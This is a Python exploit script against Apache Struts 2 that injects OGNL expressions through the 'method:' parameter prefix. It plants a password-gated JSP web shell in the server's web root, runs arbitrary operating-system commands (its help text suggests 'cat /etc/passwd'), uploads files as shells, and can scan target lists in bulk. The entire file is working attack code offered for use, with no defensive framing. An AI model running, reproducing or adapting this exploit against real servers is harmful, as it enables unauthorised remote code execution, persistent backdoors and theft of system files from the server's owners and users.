#!/usr/bin/env python
#-*- coding: utf-8 -*-     
import re
import requests
import argparse
import random
import string
from urllib import quote

def parse_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u","--url",help='test target url,for example:http://www.abc.com/index.action')
    parser.add_argument("-c","--cmd",help='the cmd to execute,for examble:"cat /etc/passwd"')
    parser.add_argument('--upload',default=False,action='store_true',help='upload file,PLEASE set --remote_file and --local_file')
    parser.add_argument('--remote_file',help='upload file to remote')
    parser.add_argument('--local_file',help='local file to upload')
    parser.add_argument("-f","--file",help='load target url from file')

    args = parser.parse_args()
    if args.url == None :
        print parser.print_help()
        print "You must set the target by -u!"
        exit()
    return args

def verify(url):
    random_file_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))+'.jsp'
    url_req = url+'?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23a%3d%23parameters.reqobj[0],%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get(%23a),%23b%3d%23req.getRealPath(%23c)%2b%23parameters.reqobj[2],%23fos%3dnew%20java.io.FileOutputStream(%23b),%23fos.write(%23parameters.content[0].getBytes()),%23fos.close(),%23hh%3d%23context.get(%23parameters.rpsobj[0]),%23hh.getWriter().println(%23b),%23hh.getWriter().flush(),%23hh.getWriter().close(),1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=%2f&reqobj='+random_file_name+'&content=gif89a%3C%25%0A%20%20%20%20if%28%22024%22.equals%28request.getParameter%28%22pwd%22%29%29%29%7B%0A%20%20%20%20%20%20%20%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime%28%29.exec%28request.getParameter%28%22l%22%29%29.getInputStream%28%29%3B%0A%20%20%20%20%20%20%20%20int%20a%20%3D%20-1%3B%0A%20%20%20%20%20%20%20%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%0A%20%20%20%20%20%20%20%20out.print%28%22%3Cpre%3E%22%29%3B%0A%20%20%20%20%20%20%20%20while%28%28a%3Din.read%28b%29%29%21%3D-1%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20out.println%28new%20String%28b%29%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20out.print%28%22%3C%2fpre%3E%22%29%3B%0A%20%20%20%20%7D%0A%25%3E'
    result = None
    try:
        r= requests.get(url_req)
        if r.status_code == 200 and re.findall(r'.*[\\/]'+random_file_name,r.text):
            result = (True,"%s----%s"%(url,re.findall(r'.*[\\/]'+random_file_name,r.text)[0]))
        else:
            result = (False,'fail')
    except Exception ,e:
        result = (False,str(e))

    return result

def execute(url,cmd):
    cmd = quote(cmd)
    result = None
    url_req = url + '?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd='+cmd+'&pp=\\\\A&ppp=%20&encoding=UTF-8'
    try:
        r= requests.get(url_req)
        if r.status_code == 200 :
            result = (True,r.text)
        else:
            result = (False,'fail!')
    except Exception ,e:
        result = (False,str(e))

    return result

def upload_file(url,remote_filename,local_filepath):
    file_content = ''
    with open(local_filepath,'r') as f:
        file_content = quote(f.read())
    url_req=url + '?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23path),%23w.print(%23parameters.shellname[0]),%23w.close(),1?%23xx:%23request.toString&shellname='+remote_filename+'&shellContent='+ file_content+'&encoding=UTF-8&pp=%2f'
    try:
        r= requests.get(url_req)
        if r.status_code == 200 and remote_filename in r.text:
            result = (True,r.text)
        else:
            result = (False,'fail!')
    except Exception ,e:
        result = (False,str(e))

    return result

def main():
    args=parse_argument()
       
    if args.file:
        f=open(args.file,'r')
        for i in f.readlines():
            url = i.strip()
            result = verify(url)
            print result[0],':',url
    elif args.upload:
        if args.remote_file == None or args.local_file == None:
            print 'You must set the --remote_file and --local_file'
            exit()
        result = upload_file(args.url,args.remote_file,args.local_file)
        if result[0]:
            print 'Success:%s' %result[1]
        else:
            print 'Fail!'
    else:
        if args.cmd:
            result = execute(args.url,args.cmd)
            if result[0]==True:
                print result[1]
            else:
                print 'False'
        else:
            result = verify(args.url)
            print result[0]
    
if __name__=="__main__":
    main()
